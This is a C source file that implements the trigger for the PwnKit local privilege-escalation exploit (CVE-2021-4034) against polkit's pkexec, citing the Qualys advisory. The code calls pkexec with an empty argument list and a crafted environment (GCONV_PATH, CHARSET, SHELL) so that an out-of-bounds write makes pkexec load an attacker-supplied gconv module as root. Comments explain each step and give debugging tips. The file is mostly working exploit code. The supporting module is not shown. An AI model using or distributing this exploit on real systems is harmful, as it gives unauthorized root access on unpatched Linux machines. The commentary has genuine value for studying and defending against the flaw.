#include <unistd.h>

// based on https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt

int main()
{
    /*
        Unfortunately, if the number of command-line arguments argc is 0 (if the
        argument list argv that we pass to execve() is empty, i.e. {NULL}), then
        argv[0] is NULL (the argument list's terminator) and:

        - at line 534, the integer n is permanently set to 1;

        - at line 610, the pointer path is read out-of-bounds from argv[1];

        - at line 639, the pointer s is written out-of-bounds to argv[1].

        But what exactly is read from and written to this out-of-bounds argv[1]?

        |---------+---------+-----+------------|---------+---------+-----+------------|
        | argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |
        |----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|
            V         V                V           V         V                V
        "program" "-option"           NULL      "value" "PATH=name"          NULL

        Clearly (because the argv and envp pointers are contiguous in memory),
        if argc is 0, then the out-of-bounds argv[1] is actually envp[0], the
        pointer to our first environment variable, "value".
    */
    const char *argv[] = {NULL};
    
    /*
        if our PATH is "PATH=name=.", and if the directory "name=." exists
        and contains an executable file named "value", then a pointer to the
        string "name=./value" is written out-of-bounds to envp[0].

        In other words, this out-of-bounds write allows us to re-introduce an
        "unsecure" environment variable (for example, LD_PRELOAD) into pkexec's
        environment; these "unsecure" variables are normally removed (by ld.so)
        from the environment of SUID programs before the main() function is
        called. We use this to introduce the dangerous "GCONV_PATH" environemnt
        variable.

        Note that `value` just has to be a valid executable and should exist at
        GCONV_PATH=./<value>. We name it libcve:. so that GCONV_PATH uses the 
        current working directory's gconv-modules, as indicated by the path 
        separator and `.` which is the current working directory
    */
    const char *value = "libcve:.";
    const char *GCONVPATH = "PATH=GCONV_PATH=.";


    /*
        g_printerr() normally prints UTF-8 error messages, but it can print
        messages in another charset if the environment variable CHARSET is not
        UTF-8 (note: CHARSET is not security sensitive, it is not an "unsecure"
        environment variable). To convert messages from UTF-8 to another
        charset, g_printerr() calls the glibc's function iconv_open().

        This triggers the loading of libcve from gconv-modules.

        References:
        https://www.gnu.org/software/libc/manual/html_node/glibc-iconv-Implementation.html
        https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/

        GOTCHAs: don't call your CHARSET NOTUTF-8, otherwise you'll be in a lot of
        debugging pain
    */
    const char *CHARSET = "CHARSET=ABCDEF";

    /*
        Trigger the error condition
        406           log_message (LOG_CRIT, TRUE,
        407                        "The value for the SHELL variable was not found the /etc/shells file");
        408           g_printerr ("\n"
        409                       "This incident has been reported.\n");
    */
    const char *SHELL = "SHELL=nope";


    const char *envp[] = {value, GCONVPATH, CHARSET, SHELL, NULL};
    execve("/usr/bin/pkexec", argv, envp);
}
